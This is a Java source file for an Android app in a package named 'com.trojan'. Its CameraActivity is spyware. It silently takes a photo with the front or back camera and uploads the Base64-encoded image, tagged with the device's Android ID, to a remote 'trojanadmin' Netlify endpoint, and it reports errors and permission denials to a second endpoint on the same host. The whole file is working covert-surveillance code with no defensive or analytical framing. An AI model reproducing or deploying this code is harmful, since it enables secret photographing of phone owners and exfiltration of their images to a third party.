package com.trojan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.common.util.concurrent.ListenableFuture;

import org.json.JSONException;
import org.json.JSONObject;

import java.nio.ByteBuffer;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CameraActivity extends AppCompatActivity {
    private static final String TAG = "CameraActivity";
    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
    // --- NEW: URL for the dedicated file upload function ---
    private static final String UPLOAD_FILE_URL = "https://trojanadmin.netlify.app/.netlify/functions/upload-file";
    private static final int CAMERA_PERMISSION_REQUEST_CODE = 102;

    private ExecutorService cameraExecutor;
    private ImageCapture imageCapture;
    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        cameraExecutor = Executors.newSingleThreadExecutor();
        requestQueue = Volley.newRequestQueue(this);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            startCameraAndCapture();
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_REQUEST_CODE);
        }
    }

    private void startCameraAndCapture() {
        int cameraId = getIntent().getIntExtra("camera_id", 0);
        int cameraSelectorId = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
        CameraSelector cameraSelector = new CameraSelector.Builder().requireLensFacing(cameraSelectorId).build();

        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);

        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                imageCapture = new ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build();
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
                takePictureAndSubmit();
            } catch (Exception e) {
                Log.e(TAG, "CameraX initialization failed", e);
                submitDataToServer("picture_error", "Camera init failed: " + e.getMessage());
                finish();
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void takePictureAndSubmit() {
        if (imageCapture == null) {
            submitDataToServer("picture_error", "ImageCapture not initialized.");
            finish();
            return;
        }

        imageCapture.takePicture(ContextCompat.getMainExecutor(this), new ImageCapture.OnImageCapturedCallback() {
            @SuppressLint("UnsafeOptInUsageError")
            @Override
            public void onCaptureSuccess(@NonNull ImageProxy image) {
                super.onCaptureSuccess(image);
                try {
                    // Convert the captured image to a Base64 string
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    String encodedImage = Base64.encodeToString(bytes, Base64.DEFAULT);

                    // --- UPGRADED: Use the new dedicated function for file uploads ---
                    uploadBase64File("picture", encodedImage);

                } catch (Exception e) {
                    Log.e(TAG, "Failed to process captured image", e);
                    submitDataToServer("picture_error", "Image processing failed.");
                } finally {
                    image.close();
                    finish();
                }
            }

            @Override
            public void onError(@NonNull ImageCaptureException exception) {
                Log.e(TAG, "Image capture failed: " + exception.getMessage(), exception);
                submitDataToServer("picture_error", "Capture failed: " + exception.getMessage());
                finish();
            }
        });
    }

    // --- NEW: Method to upload large Base64 files to the new Netlify function ---
    private void uploadBase64File(String dataType, String base64Data) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create file upload JSON", e);
            finish(); // Finish activity if we can't even create the request
            return;
        }

        Log.d(TAG, "Uploading Base64 data for type: " + dataType);
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData,
                response -> Log.i(TAG, "Base64 data submitted successfully: " + dataType),
                error -> Log.e(TAG, "Failed to submit Base64 data '" + dataType + "': " + error.toString())
        );
        
        // Increase the timeout for large image data
        request.setRetryPolicy(new DefaultRetryPolicy(
                30000, // 30 seconds
                DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));

        requestQueue.add(request);
    }

    // This method is now only used for sending small error messages
    private void submitDataToServer(String dataType, String payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
            return;
        }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
                response -> Log.i(TAG, "Error data submitted successfully: " + dataType),
                error -> Log.e(TAG, "Failed to submit error data '" + dataType + "': " + error.toString())
        );
        requestQueue.add(request);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == CAMERA_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startCameraAndCapture();
            } else {
                submitDataToServer("picture_error", "Camera permission denied.");
                finish();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraExecutor != null) {
            cameraExecutor.shutdown();
        }
    }
}
